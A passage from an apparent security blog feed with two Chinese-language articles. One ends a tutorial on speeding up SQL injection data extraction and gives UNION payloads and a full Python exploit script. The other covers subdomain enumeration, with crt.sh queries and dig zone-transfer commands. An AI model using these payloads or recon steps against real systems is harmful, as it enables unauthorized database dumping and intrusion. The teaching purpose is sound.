string\">'information_schema'</span><br><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1672588800</span><span class=\"token punctuation\">,</span><br>      ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><br>      <span class=\"token operator\">+</span> ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><br>      <span class=\"token operator\">+</span> ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><br>      <span class=\"token operator\">+</span> <span class=\"token number\">1672588800</span><br>    <span class=\"token punctuation\">,</span><span class=\"token number\">1</span>  <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">WHERE</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'mysql'</span> <span class=\"token operator\">AND</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'information_schema'</span><br><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1672675200</span><span class=\"token punctuation\">,</span><br>      ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><br>      <span class=\"token operator\">+</span> ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><br>      <span class=\"token operator\">+</span> ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><br>      <span class=\"token operator\">+</span> <span class=\"token number\">1672675200</span><br>    <span class=\"token punctuation\">,</span><span class=\"token number\">1</span>  <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">WHERE</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'mysql'</span> <span class=\"token operator\">AND</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'information_schema'</span><br><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code></pre>\n<p>腳本如下：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># exploit-ava-30x.py</span><br><span class=\"token keyword\">import</span> requests<br><span class=\"token keyword\">import</span> datetime<br><span class=\"token keyword\">import</span> json<br><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse<br><span class=\"token keyword\">import</span> time<br><br><span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">def</span> <span class=\"token function\">to_ts</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">return</span> datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>strptime<span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%Y-%m-%d\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>host <span class=\"token operator\">=</span> <span class=\"token string\">'https://od-php.herokuapp.com/sql'</span><br>base_time <span class=\"token operator\">=</span> <span class=\"token number\">1672502400</span><br>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><br>field <span class=\"token operator\">=</span> <span class=\"token string\">'group_concat(table_name)'</span><br>fr <span class=\"token operator\">=</span> <span class=\"token string\">\" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\"</span><br>start_time <span class=\"token operator\">=</span> <span class=\"token string\">'2023-01-01'</span><br>end_time <span class=\"token operator\">=</span> <span class=\"token string\">'2023-01-10'</span><br>date_count <span class=\"token operator\">=</span> <span class=\"token number\">10</span><br>fetch_per_union <span class=\"token operator\">=</span> <span class=\"token number\">3</span><br><br>start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span><br>  unions <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><br>  query_time <span class=\"token operator\">=</span> base_time<br>  <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>date_count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'''<br>      ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400<br>      + ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400*128<br>      + ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400*128*128<br>      + </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>query_time<span class=\"token punctuation\">}</span></span><span class=\"token string\"><br>    '''</span></span><br><br>    unions<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'union select 1,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>query_time<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1 </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>fr<span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span><br>    index <span class=\"token operator\">+=</span> fetch_per_union<br>    query_time <span class=\"token operator\">+=</span> <span class=\"token number\">86400</span><br><br>  payload <span class=\"token operator\">=</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>unions<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><br>  response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>host<span class=\"token punctuation\">}</span></span><span class=\"token string\">/availability.php?id=12345%20</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;start_time=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>start_time<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;end_time=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>end_time<span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> response<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">break</span><br><br>  data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><br>  is_finished <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><br>  <span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">'events'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><br>    diff <span class=\"token operator\">=</span> to_ts<span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">[</span><span class=\"token string\">'end'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> to_ts<span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">[</span><span class=\"token string\">'start'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><br>    diff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>diff<span class=\"token operator\">/</span><span class=\"token number\">86400</span><span class=\"token punctuation\">)</span><br>    is_finished <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><br>    <span class=\"token keyword\">if</span> diff <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>      is_finished <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><br>      <span class=\"token keyword\">break</span><br><br>    count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><br>    <span class=\"token keyword\">while</span> diff <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>      num <span class=\"token operator\">=</span> diff <span class=\"token operator\">%</span> <span class=\"token number\">128</span><br>      <span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        is_finished <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><br>        <span class=\"token keyword\">break</span><br>      count<span class=\"token operator\">+=</span><span class=\"token number\">1</span><br>      result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><br>      diff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>diff <span class=\"token operator\">-</span> num<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><br><br>    <span class=\"token keyword\">if</span> count <span class=\"token operator\">!=</span> fetch_per_union<span class=\"token punctuation\">:</span><br>      is_finished <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><br>      <span class=\"token keyword\">break</span><br><br>    <span class=\"token keyword\">if</span> is_finished<span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">break</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"current:\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><br><br>  <span class=\"token keyword\">if</span> is_finished<span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">break</span><br><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"time: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start<span class=\"token punctuation\">}</span></span><span class=\"token string\">s\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>執行結果會長這樣，可以看到每一筆資料的 end 都攜帶了 3 個字元的資訊在裡面：</p>\n<p><img src=\"/img/posts/huli/sql-injection-in-action/p8.png\" alt=\"\"></p>\n<p>這次只用了 1 個 query，總共花了 4 秒，就得到了 30 個字元，大多數時間其實都是花在 SQL 對於 query 的處理。</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>所有範例程式碼都在這邊：<a href=\"https://github.com/aszx87410/demo/tree/master/sql-injection\">https://github.com/aszx87410/demo/tree/master/sql-injection</a></p>\n<p>雖然說大部分狀況可能用多執行緒就可以搞定了，但要考慮到有些 Server 可能有 rate limiting，沒辦法送這麼多 request。撇開繞過 rate limiting 不談，我認為如何讓一個 query 傳回最大的資訊量，並且減少 request 的數量這件事情滿有趣的，因此才有了這篇文章還有各式各樣的方法。</p>\n<p>第一個案例中最後是用了三分搜降低 request 數量，第二個案例則是用了把字串轉成數字的方式，將資料偷渡到日期裡，並用多個日期來偷渡更多的字元。</p>\n<p>另外，上面的實作中所用的 <code>ASCII</code> 函式有所限制，例如說如果是中文就會爆炸，這時候可以改用 <a href=\"https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_ord\">ORD</a> 或是 <a href=\"https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_hex\">HEX</a> 之類的，支援度會更好。</p>\n<p>這些解法我認為要想到應該都不難，但最麻煩的是實作的部分，原本我其實也沒有想做的，只想在文章裡面寫一句「理論上這樣做可以更快，實作就交給大家自己來了」，但想了想覺得還是應該要做一下。</p>\n<p>若只是想證明 SQL injection 的漏洞存在，其實做到最慢的方法就打完收工了，但我還是會好奇：「如果真的想把整個資料庫 dump 出來，怎麼做比較快？」，或許該找個時間研究一下 sqlmap，應該可以得到不少靈感。</p>\n<p>參考資料：</p>\n<ol>\n<li><a href=\"https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/\">Comma is forbidden! No worries!! Inject in insert/update queries without it</a></li>\n</ol>\n",
      "date_published": "2022-01-19T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-3/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-3/",
      "title": "DNS Hacking 之 Subdomain Enumeration 的技巧與自動化挖掘",
      "content_html": "<!-- summary -->\n<p>總算講完理論的部分啦！這一篇裡，我們要來看看如何挖掘一個網站的子網域，建立更大的攻擊面，並介紹有哪些實用工具。最後，我會講一下我自己的自動化 recon 流程。</p>\n<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>做滲透的第一步都是先收集資料，了解你的目標有哪些資產、哪些範圍、以及這些服務之間的關係。對目標的架構有更多認識，才能幫你判定哪些攻擊面是比較關鍵、比較脆弱、或是比較有價值的。而其中一個非常重要的資訊，就是目標網域的相關網域跟子網域。也許你在主網站沒有發現什麼問題，但卻挖到了後台登入頁面的漏洞、或是發現某個暴露在外的內部服務，通常這些地方的防護沒那麼嚴謹而且都藏著很有價值的線索，說不定就是一次測試的重大發現。同時，許多子網域常常都是為了使用第三方服務所架設的，當這些服務有漏洞時，目標網域當然也會跟著受到影響，因此當你有一個子網域清單，就能對測試目標對外的系統架構有多一些瞭解，也更容易發現可能的突破點。</p>\n<p>收集子網域資訊，可以從被動跟主動兩方面著手。</p>\n<p>被動（passive recon）指的是不跟目標做互動，單純透過搜索引擎跟其他公開服務來得到資訊，基本上就是查資料，不會對目標造成任何影響或留下足跡，對方甚至也不會知道。主動（active recon）則是透過跟目標的互動來枚舉資訊，也許會造成比較大的流量或是被對方的偵測機制記錄下來。</p>\n<h2 id=\"%E8%A2%AB%E5%8B%95%EF%BC%88passive-recon%EF%BC%89\"><a class=\"direct-link\" href=\"#%E8%A2%AB%E5%8B%95%EF%BC%88passive-recon%EF%BC%89\">#</a> 被動（passive recon）</h2>\n<p>前面提過，被動搜集就是找資料，所以這邊提供大家一些適合尋寶的地方：</p>\n<h3 id=\"google-dorks\"><a class=\"direct-link\" href=\"#google-dorks\">#</a> Google dorks</h3>\n<p>這個應該不用多作解釋，就是利用 Google 搜尋引擎的功能來找到頁面。</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/dorking.png\" /><figcaption><p>Google dorking <a href=\"http://amazon.com\">amazon.com</a></p>\n</figcaption></figure></p>\n<p>好處是這個方法找到的通常都會有網站而且在使用中，不管是要再往下挖、只找或只排除某個網域，也只要在搜尋欄位加一些其他參數就好。<br>\n反之，壞處就是只能找到有網站的子網域，一些其他的服務（例如 ftp）可能就找不到了。</p>\n<p>當然，Google 可以 dorking 其他的搜尋引擎也可以。譬如說用 duckduckgo 或是 bing 都能得到不一樣的結果。</p>\n<h3 id=\"certificate-transparency\"><a class=\"direct-link\" href=\"#certificate-transparency\">#</a> Certificate Transparency</h3>\n<p>大家都聽過網站憑證，也知道它的安全性除了建立在密碼學的基礎上，更是仰賴我們對 Certificate Authority (CA) 的信任。於是有人質疑了：要如何確保 CA 是可以信任的，沒有亂發憑證或是被駭客入侵所以簽署惡意憑證呢？有沒有人可以監察這些守門人？</p>\n<p>在這些考量下，Certificate Transparency (CT) 誕生了。CT 是一個由多個 CA 合作的專案，透過共同維護一個龐大的分散式資料庫，把每一張憑證的申請單位、核准的 CA、發行的時間等資訊全部記錄下來並透明化公開，讓任何人都可以監督或分析。能延伸的應用很多，例如網域擁有者可以監測自家網域的憑證狀態，及時發現明明沒有註冊卻憑空出現的憑證，或是資安產品也可以做成曝險控管服務，甚至應用在資安事件後的鑑識證據等等。</p>\n<p>這個專案的參與者涵括多個較大的供應商，如 Google、Cloudfare、Digicert、Let's Encrypt、Sectigo 等等，你可以在 <a href=\"https://certificate.transparency.dev/\">CT 的專案網頁</a> 上看到更多資訊。這些供應商通常也會在他們的服務裡加入監測功能，讓你可以直接從 dashboard 上看到警訊或是從 email 收到通知。</p>\n<p>有些公司也會做成公開介面、API、或是開放資料庫連結供大家查詢：</p>\n<ul>\n<li><a href=\"https://www.google.com/transparencyreport/https/ct/\">Google</a></li>\n<li><a href=\"https://ct.cloudflare.com/\">Cloudfare - Merkle Town</a></li>\n<li><a href=\"https://crt.sh/\">Sectigo - crt.sh</a></li>\n<li><a href=\"https://letsencrypt.org/docs/ct-logs/\">Let's Encrypt - Oak</a></li>\n</ul>\n<p>既然所有有發行憑證的網域都會留下紀錄，那我們當然可以利用這個服務來列舉子網域。下面這張圖是用 Sectigo 提供的 <a href=\"http://crt.sh\">crt.sh</a> 來搜尋 <a href=\"http://amazon.com\">amazon.com</a> 的結果：</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/ct.png\" /><figcaption><p>certificate transparency: <a href=\"http://amazon.com\">amazon.com</a></p>\n</figcaption></figure></p>\n<p>或是用 <a href=\"http://crt.sh\">crt.sh</a> 的話可以用 psql 連進去查：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">$ psql -h crt.sh -p 5432 -U guest certwatch<br><br>certwatch=> SELECT distinct(NAME_VALUE) FROM certificate_identity ci WHERE ci.NAME_TYPE = 'dNSName' AND reverse(lower(ci.NAME_VALUE)) LIKE reverse(lower('%.amazon.com'));</code></pre>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/psql-crt.png\" /><figcaption><p><a href=\"http://crt.sh\">crt.sh</a> with psql: <a href=\"http://amazon.com\">amazon.com</a></p>\n</figcaption></figure></p>\n<p>跟 google dorking 一樣，CT 上面有紀錄的網域至少都是曾經存在過的，不過目前是否仍在使用就需要進一步過濾。還有，CT 畢竟只顯示有申請憑證的紀錄，所以沒有網頁服務或是不使用憑證的 HTTP 網域就找不到了。</p>\n<h3 id=\"%E5%85%AC%E9%96%8B%E6%9C%8D%E5%8B%99%E8%88%87%E8%B3%87%E6%96%99%E9%9B%86\"><a class=\"direct-link\" href=\"#%E5%85%AC%E9%96%8B%E6%9C%8D%E5%8B%99%E8%88%87%E8%B3%87%E6%96%99%E9%9B%86\">#</a> 公開服務與資料集</h3>\n<p>下面列舉的第三方服務不見得本來就是為了記錄網域而開發的，但是他們查找的資訊卻很適合我們的目的，因此也可以作為來源之一加入我們的清單。</p>\n<h5 id=\"rapid-7-fdns\"><a class=\"direct-link\" href=\"#rapid-7-fdns\">#</a> Rapid 7 FDNS</h5>\n<p>Rapid 7 自 2013 起，為了分析網路上的流量跟系統而發起了名為 Project Sonar 的計畫，除了 SSL、DNS、HTTP 相關的流量外也包含了 UDP 的服務，至今累積了十分龐大的資料庫。後來他們將這些資料釋出，供學術研究或其他分析用途，而其中一份每月更新的資料就是 <a href=\"https://opendata.rapid7.com/sonar.fdns_v2/\">FDNS (Forward DNS)</a> ，紀錄了 Project Sonar 偵測到的所有 DNS 紀錄：</p>\n<blockquote>\n<p>DNS 'ANY', 'A', 'AAAA', 'TXT', 'MX', and 'CNAME' responses for known forward DNS names. This dataset contains the responses to DNS requests for all forward DNS names known by Rapid7's Project Sonar. The file is a GZIP compressed file containing the name, type, value and timestamp of any returned records for a given name in JSON format.</p>\n</blockquote>\n<p>你可以自己 parse 這些資料擷取出需要的資訊，不過這些檔案非常大，壓縮後都還有 20+ GB，所以一般人電腦上要存放應該不太容易，是個豐富而龐大的資源。</p>\n<h5 id=\"virustotal\"><a class=\"direct-link\" href=\"#virustotal\">#</a> VirusTotal</h5>\n<p>沒錯，就是那個什麼檔案都丟上去看看的 VirusTotal，他其實也有檢測網域的功能。</p>\n<p>只要到這個網址：<code>https://www.virustotal.com/gui/domain/{domain_name}/relations</code>，往下滑就會有子網域的列表跟評分，例如：</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/virustotal.png\" /><figcaption><p>virustotal: <a href=\"http://amazon.com\">amazon.com</a></p>\n</figcaption></figure></p>\n<h5 id=\"searchcode\"><a class=\"direct-link\" href=\"#searchcode\">#</a> searchcode</h5>\n<p>連各種服務的 access key 或是資料庫帳號密碼都可以寫死在程式裡面推到 github 上去了，子網域為什麼不行？<a href=\"https://searchcode.com/\">searchcode</a> 這個服務就是一個開源程式庫的搜尋引擎，幫你找到藏在字裡行間的那些網域名稱！搜尋的範圍包括 github、bitbucket、gitlab、google code、sourceforge 等等，也有提供 API 使用。</p>\n<p>試試看：</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/searchcode.png\" /><figcaption><p>searchcode: <a href=\"http://amazon.com\">amazon.com</a></p>\n</figcaption></figure></p>\n<p>不過我個人覺得這個方法能找到的結果有限，畢竟除非是開發者自己不小心洩漏，不然一般寫 code 的時候會用到的都是公開的 API 或 SDK 規定的 endpoint，搜尋結果同值性較高。當然如果直接找到前人（？）整裡好的子網域清單就是中獎了 XDDD</p>\n<h5 id=\"dnsdumpster\"><a class=\"direct-link\" href=\"#dnsdumpster\">#</a> DNSDumpster</h5>\n<p>這也是一個免費且公開的服務，由 <a href=\"http://HackerTarget.com\">HackerTarget.com</a> 維護，旨在讓 DNS 的 recon 更輕鬆方便。<a href=\"https://dnsdumpster.com/\">網頁</a> 上寫著：</p>\n<blockquote>\n<p><a href=\"http://DNSdumpster.com\">DNSdumpster.com</a> is a FREE domain research tool that can discover hosts related to a domain. Finding visible hosts from the attackers perspective is an important part of the security assessment process.<br>\nMore than a simple DNS lookup this tool will discover those hard to find sub-domains and web hosts. The search relies on data from our crawls of the Alexa Top 1 Million sites, Search Engines, Common Crawl, Certificate Transparency, Max Mind, Team Cymru, Shodan and <a href=\"http://scans.io\">scans.io</a>.</p>\n</blockquote>\n<p>一樣用 <a href=\"http://amazon.com\">amazon.com</a> 試試看：</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/dumpster-1.png\" /><figcaption><p>DNSDumpster: <a href=\"http://amazon.com\">amazon.com</a></p>\n</figcaption></figure></p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/dumpster-2.png\" /><figcaption><p>DNSDumpster: <a href=\"http://amazon.com\">amazon.com</a></p>\n</figcaption></figure></p>\n<p>因為 <a href=\"http://HackerTarget.com\">HackerTarget.com</a> 本來就有在做網路掃描，所以這邊得到的子網域清單也是定期每月更新一次，跟 Shodan 一樣不是實時的最新結果，而且超過一百筆過後就要升級收費查詢次數也有限制。 DNSDumpster 整合了多個資料來源，甚至還會整理成網域之間的關聯圖，其實也算是做過一點自動化了。</p>\n<h2 id=\"%E4%B8%BB%E5%8B%95%EF%BC%88active-recon%EF%BC%89\"><a class=\"direct-link\" href=\"#%E4%B8%BB%E5%8B%95%EF%BC%88active-recon%EF%BC%89\">#</a> 主動（active recon）</h2>\n<p>下面介紹幾個透過 DNS 做主動 recon 的小技巧。跟被動搜集不一樣，因為是直接跟對方的 DNS 拿到的資料，所以準確率機戶是百分百。除了用 DNS 之外，從網站上爬出所有連結然後整理成列表也是一個方法，不過既然是爬蟲這裡就不寫了。</p>\n<p>以下需要一點 DNS 背景知識，如果有不理解的概念或名詞可以參考：</p>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-1/\">DNS Hacking 之 基礎知識：DNS 運作與紀錄類型</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-2/\">DNS Hacking 之 電話簿攻防之術：DNSSEC、DoT/DoH</a></p>\n<h3 id=\"zone-transfer\"><a class=\"direct-link\" href=\"#zone-transfer\">#</a> zone transfer</h3>\n<p>我們介紹 DNS zones 時說過，SOA 紀錄裡寫的會是主要負責該 zone 的 primary nameserver，但一個 zone 裡其實還會有其他備用或是用於 load balancing 的 secondary nameserver。為了讓資訊同步，將 primary nameserver 的 zone file 複製一份到 secondary nameserver 的這個溝通過程，就稱為 zone transfer。</p>\n<p>轉移的模式有兩種：</p>\n<ul>\n<li>Full transfer (AXFR): 當新的 DNS 上線時，會做 Full transfer 把整個 zone 的資訊都複製一份過去，是相對耗時且耗資源的做法。</li>\n<li>Incremental transfer (IXFR): 與 Full transfer 不同，只傳送有被更新的部分，是比較有效率且省資源的做法。兩台 DNS 是否有一樣的紀錄依據 SOA 紀錄中的 SERIAL 欄位判定。</li>\n</ul>\n<p>zone transfer 這個機制本身並沒有問題，出事的是常常有設定上的缺失。zone transfer 理應是負責一個 zone 的多個 DNS 之間溝通用的，不應該允許任意發起請求的機器得到這個資訊。特別是自架的 DNS 服務，網管人員也許沒有太多資安意識，可以運作就好了，所以容易有設定出錯。當設定開啟 zone transfer 功能卻沒有設定白名單來控管傳送對象時，就會讓我們有機可乘，輕輕鬆鬆透過一個指令發起 zone transfer：</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># get authoritative nameservers</span><br><span class=\"token function\">dig</span> ns <span class=\"token operator\">&lt;</span>domain<span class=\"token operator\">></span><br><br><span class=\"token comment\"># request zone transfer</span><br><span class=\"token function\">dig</span> axfr @<span class=\"token operator\">&lt;</span>nameserver<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>domain<span class=\"token operator\">></span></code></pre>\n<p>例如之前不小心掃到的一家公司，毫不保留的全部都吐出來了：</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/transfer.png\" /><figcaption><p>zone transfer</p>\n</figcaption></figure></p>\n<p>也許你會覺得，應該很少人會犯這種錯誤吧？也不算太嚴重啊？其實這個錯誤比你想的更普遍、影響也更廣。</p>\n<p>幾個月前我們幫一家公司做滲透測試的時候，意外的發現他們的網域有 zone transfer 的弱點。但更意外的是，他們用的 authoritative DNS 不是自己架的，而是用一家台灣非常大的 DNS provider 的服務。也就是說，所有跟這家供應商註冊網域跟使用 DNS 